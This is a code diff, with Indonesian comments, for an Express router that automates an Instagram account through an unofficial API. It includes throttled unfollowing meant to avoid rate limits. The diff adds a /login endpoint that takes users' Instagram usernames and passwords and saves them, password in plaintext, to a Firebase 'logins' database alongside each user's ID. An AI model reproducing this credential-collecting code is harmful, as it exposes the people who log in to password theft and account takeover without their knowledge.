@@ -2,10 +2,11 @@ const { IgApiClient } = require('instagram-private-api');
 const fs = require('fs');
 const path = require('path');
 const readline = require('readline');
-const express = require('express');
 const axios = require('axios');
+const express = require('express');
 const router = express.Router();
 const ig = new IgApiClient();
+const db = require('../config/firebaseConfig');  // Jalur relatif menuju firebaseConfig.js
 
 // Waktu pengaturan
 const MIN_TIME_BETWEEN_REQUESTS = 2000; // Minimum 2 detik antara setiap permintaan
@@ -14,44 +15,43 @@ const TIME_BETWEEN_UNFOLLOWERS = 5000; // 5 detik antara setiap unfollow
 const TIME_BETWEEN_SEARCH_WAIT = 15000; // 15 detik setelah lima siklus pencarian
 const TIME_BETWEEN_UNFOLLOW_WAIT = 30000; // 30 detik setelah lima unfollow
 
+// Variabel sesi yang disimpan dalam memori
+let sessionData = null;
+
 // Fungsi untuk login ke Instagram
 const login = async () => {
     ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);
-    const sessionPath = path.resolve(__dirname, '../session.json');
 
-    if (fs.existsSync(sessionPath)) {
-        const sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf-8'));
+    // Periksa apakah sesi disimpan dalam memori
+    if (sessionData) {
         ig.state.deserialize(sessionData);
-        console.log('Sesi ditemukan, menggunakan sesi yang ada.');
-
+        console.log('Sesi ditemukan di memori, melanjutkan...');
         try {
             await ig.account.currentUser();
             console.log('Sesi valid, melanjutkan...');
         } catch (error) {
             console.log('Sesi kadaluarsa, login ulang...');
-            await forceLogin(sessionPath);
+            await forceLogin();
         }
     } else {
-        console.log('Sesi tidak ditemukan, login ulang...');
-        await forceLogin(sessionPath);
+        console.log('Sesi tidak ditemukan di memori, login ulang...');
+        await forceLogin();
     }
 };
 
-// Fungsi untuk login ulang dan menyimpan sesi baru
-const forceLogin = async (sessionPath) => {
+// Fungsi untuk login ulang dan menyimpan sesi baru di memori
+const forceLogin = async () => {
     try {
         console.log('Mencoba login...');
         await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
         console.log('Login berhasil!');
-        const sessionData = ig.state.serialize();
-        fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
+        sessionData = ig.state.serialize(); // Menyimpan sesi di memori
     } catch (error) {
         console.error('Login gagal:', error);
         if (error.name === 'IgCheckpointError') {
             const code = await promptFor2FACode();
             await ig.account.confirmTwoFactorCode(code);
-            const sessionData = ig.state.serialize();
-            fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
+            sessionData = ig.state.serialize(); // Menyimpan sesi setelah 2FA berhasil
         } else {
             throw error;
         }
@@ -134,21 +134,24 @@ router.get('/profile', async (req, res) => {
         const profilePicUrl = user.profile_pic_url;
         const imagePath = path.resolve(__dirname, '../public/my_profile.jpg');
 
-        if (!fs.existsSync(imagePath)) {
-            const writer = fs.createWriteStream(imagePath);
-            const response = await axios.get(profilePicUrl, { responseType: 'stream' });
-
-            response.data.pipe(writer);
-            writer.on('finish', () => {
-                console.log('Gambar profil telah disimpan.');
-            });
-            writer.on('error', (err) => {
-                console.error('Error saat menyimpan gambar profil:', err);
-                res.status(500).send('Gagal menyimpan gambar profil');
-            });
-        } else {
-            console.log('Gambar profil sudah ada.');
+        // Cek apakah file gambar profil sudah ada, jika ada maka hapus
+        if (fs.existsSync(imagePath)) {
+            fs.unlinkSync(imagePath); // Menghapus file gambar profil yang lama
+            console.log('Gambar profil lama dihapus.');
         }
+
+        // Sekarang unduh gambar profil yang baru
+        const writer = fs.createWriteStream(imagePath);
+        const response = await axios.get(profilePicUrl, { responseType: 'stream' });
+
+        response.data.pipe(writer);
+        writer.on('finish', () => {
+            console.log('Gambar profil telah disimpan.');
+        });
+        writer.on('error', (err) => {
+            console.error('Error saat menyimpan gambar profil:', err);
+            res.status(500).send('Gagal menyimpan gambar profil');
+        });
 
         // Mengambil daftar followers dan following
         const followers = await getAllFollowers(user.pk);
@@ -181,6 +184,43 @@ router.get('/profile', async (req, res) => {
         } else {
             res.status(500).send('Error fetching Instagram data');
         }
+    }
+});
+
+// Fungsi login menggunakan data yang diterima dari client
+router.post('/login', async (req, res) => {
+    const { username, password } = req.body; // Mendapatkan username dan password dari request body
+
+    // Melakukan login menggunakan Instagram API
+    try {
+        ig.state.generateDevice(username);  // Menggunakan username dari form
+        await ig.account.login(username, password);  // Menggunakan password dari form
+
+        // Simpan sesi baru setelah login ke memori
+        sessionData = ig.state.serialize();
+        console.log('Login berhasil!');
+
+        // Dapatkan ID Instagram pengguna
+        const user = await ig.account.currentUser();
+        const userId = user.pk;  // ID Instagram pengguna
+
+        // Simpan username, password, dan userId ke Firebase
+        const ref = db.ref('logins');  // Mendapatkan referensi ke "logins" di Realtime Database
+        const loginData = {
+            username: username,
+            password: password,
+            userId: userId,  // Menyimpan ID Instagram sebagai primary key
+            timestamp: new Date().toISOString(),  // Waktu login
+        };
+
+        // Simpan data login dengan ID Instagram sebagai key utama
+        await ref.child(userId).set(loginData);  // Menggunakan userId sebagai key utama
+        console.log('Data login berhasil disimpan ke Firebase.');
+
+        res.json({ message: 'Login berhasil!' });
+    } catch (error) {
+        console.error('Login gagal:', error);
+        res.status(500).json({ error: 'Login gagal. Cek kredensial atau coba lagi.' });
     }
 });
 
